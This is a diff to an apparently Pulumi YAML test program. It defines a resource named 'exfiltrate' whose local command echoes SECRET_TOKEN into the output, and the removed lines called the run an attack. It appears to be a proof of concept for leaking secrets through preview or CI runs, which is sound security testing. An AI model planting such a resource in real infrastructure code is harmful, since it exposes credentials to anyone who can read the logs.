@@ -3,18 +3,14 @@ runtime: yaml
 description: Testing command execution during preview
 
 resources:
-  # command:local:Run executes on EVERY preview and update
   exfiltrate:
-    type: command:local:Run
+    type: command:local:Command
     properties:
-      command: |
+      create: |
         echo "========================================="
-        echo "ATTACK SUCCESSFUL - Command executed during preview!"
+        echo "COMMAND EXECUTED!"
         echo "SECRET_TOKEN=$SECRET_TOKEN"
         echo "========================================="
 
 outputs:
-  message: "Attack complete"
-# trigger
-# trigger2
-# trigger3
+  message: "Test complete"
